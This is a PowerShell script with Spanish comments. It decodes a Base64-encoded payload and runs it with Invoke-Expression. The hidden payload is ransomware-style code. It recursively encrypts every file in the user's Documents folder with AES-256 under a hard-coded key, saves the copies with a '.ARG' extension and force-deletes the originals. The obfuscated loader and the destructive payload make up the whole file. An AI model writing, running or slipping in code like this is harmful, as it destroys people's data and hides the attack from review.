$Base64String="JGZvbGRlclBhdGggPSBKb2luLVBhdGggJGVudjpVU0VSUFJPRklMRSAiTWlzIGRvY3VtZW50b3MiDQoNCiRDbGF2ZT0iSG9sYU11bmRvIg0KDQojIFZlcmlmaWNhciBzaSBsYSBjYXJwZXRhIGV4aXN0ZQ0KaWYgKC1Ob3QgKFRlc3QtUGF0aCAtUGF0aCAkZm9sZGVyUGF0aCkpIHsNCiAgICBXcml0ZS1Ib3N0ICJMYSBjYXJwZXRhIGVzcGVjaWZpY2FkYSBubyBleGlzdGUuIg0KICAgIGV4aXQNCn0NCg0KIyBDb252aWVydGUgbGEgY2xhdmUgZW4gYnl0ZXMgeSBnZW5lcmEgdW5hIGNsYXZlIGRlIDI1NiBiaXRzICgzMiBieXRlcykNCiRjbGF2ZUJ5dGVzID0gW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRCeXRlcygkQ2xhdmUpDQppZiAoJGNsYXZlQnl0ZXMuTGVuZ3RoIC1sdCAzMikgew0KICAgICRjbGF2ZUJ5dGVzID0gJGNsYXZlQnl0ZXMgKyAoMC4uKDMxIC0gJGNsYXZlQnl0ZXMuTGVuZ3RoKSB8IEZvckVhY2gtT2JqZWN0IHsgMCB9KQ0KfSBlbHNlaWYgKCRjbGF2ZUJ5dGVzLkxlbmd0aCAtZ3QgMzIpIHsNCiAgICAkY2xhdmVCeXRlcyA9ICRjbGF2ZUJ5dGVzWzAuLjMxXQ0KfQ0KDQojIEdlbmVyYSB1biBJViBhbGVhdG9yaW8gZGUgMTYgYnl0ZXMNCiRpdiA9IE5ldy1PYmplY3QgYnl0ZVtdIDE2DQpbU3lzdGVtLlNlY3VyaXR5LkNyeXB0b2dyYXBoeS5SYW5kb21OdW1iZXJHZW5lcmF0b3JdOjpDcmVhdGUoKS5HZXRCeXRlcygkaXYpDQoNCiMgRW51bWVyYXIgdG9kb3MgbG9zIGFyY2hpdm9zIGVuIGxhIGNhcnBldGEgeSBzdWJjYXJwZXRhcw0KJGZpbGVzID0gR2V0LUNoaWxkSXRlbSAtUGF0aCAkZm9sZGVyUGF0aCAtUmVjdXJzZSAtRmlsZQ0KDQojIEdlbmVyYXIgbGEgbGlzdGEgZGUgcnV0YXMgY29tcGxldGFzDQpmb3JlYWNoICgkZmlsZSBpbiAkZmlsZXMpIHsNCg0KJEFyY2hpdm89JGZpbGUuRnVsbE5hbWUNCg0KIyBDcmVhIGVsIG9iamV0byBBRVMNCiRhZXMgPSBbU3lzdGVtLlNlY3VyaXR5LkNyeXB0b2dyYXBoeS5BZXNdOjpDcmVhdGUoKQ0KJGFlcy5LZXlTaXplID0gMjU2DQokYWVzLkJsb2NrU2l6ZSA9IDEyOA0KJGFlcy5Nb2RlID0gW1N5c3RlbS5TZWN1cml0eS5DcnlwdG9ncmFwaHkuQ2lwaGVyTW9kZV06OkNCQw0KJGFlcy5QYWRkaW5nID0gW1N5c3RlbS5TZWN1cml0eS5DcnlwdG9ncmFwaHkuUGFkZGluZ01vZGVdOjpQS0NTNw0KJGFlcy5LZXkgPSAkY2xhdmVCeXRlcw0KJGFlcy5JViA9ICRpdg0KDQojIExlZSBlbCBjb250ZW5pZG8gZGVsIGFyY2hpdm8gb3JpZ2luYWwNCiRjb250ZW5pZG8gPSBbU3lzdGVtLklPLkZpbGVdOjpSZWFkQWxsQnl0ZXMoJEFyY2hpdm8pDQoNCiMgQ2lmcmEgZWwgY29udGVuaWRvDQokZW5jcnlwdG9yID0gJGFlcy5DcmVhdGVFbmNyeXB0b3IoKQ0KJGNvbnRlbmlkb0NpZnJhZG8gPSAkZW5jcnlwdG9yLlRyYW5zZm9ybUZpbmFsQmxvY2soJGNvbnRlbmlkbywgMCwgJGNvbnRlbmlkby5MZW5ndGgpDQoNCiMgQ29tYmluYSBlbCBJViB5IGVsIGNvbnRlbmlkbyBjaWZyYWRvDQokc2FsaWRhID0gTmV3LU9iamVjdCBieXRlW10gKCRpdi5MZW5ndGggKyAkY29udGVuaWRvQ2lmcmFkby5MZW5ndGgpDQpbQXJyYXldOjpDb3B5KCRpdiwgMCwgJHNhbGlkYSwgMCwgJGl2Lkxlbmd0aCkNCltBcnJheV06OkNvcHkoJGNvbnRlbmlkb0NpZnJhZG8sIDAsICRzYWxpZGEsICRpdi5MZW5ndGgsICRjb250ZW5pZG9DaWZyYWRvLkxlbmd0aCkNCg0KIyBHdWFyZGEgZWwgYXJjaGl2byBjaWZyYWRvIGNvbiBsYSBleHRlbnNpw7NuIC5BUkcNCiRydXRhU2FsaWRhID0gIiRBcmNoaXZvLkFSRyINCltTeXN0ZW0uSU8uRmlsZV06OldyaXRlQWxsQnl0ZXMoJHJ1dGFTYWxpZGEsICRzYWxpZGEpDQoNClJlbW92ZS1JdGVtIC1QYXRoICRBcmNoaXZvIC1Gb3JjZQ0KDQpXcml0ZS1PdXRwdXQgIkFyY2hpdm8gY2lmcmFkbyBndWFyZGFkbyBjb21vOiAkcnV0YVNhbGlkYSINCn0="

try {
    # Decodificar la cadena Base64
    $decodedBytes = [System.Convert]::FromBase64String($Base64String)
    $decodedString = [System.Text.Encoding]::UTF8.GetString($decodedBytes)

    Invoke-Expression $decodedString
}
catch {
    Write-Error "Error al decodificar o ejecutar la cadena: $_"
}
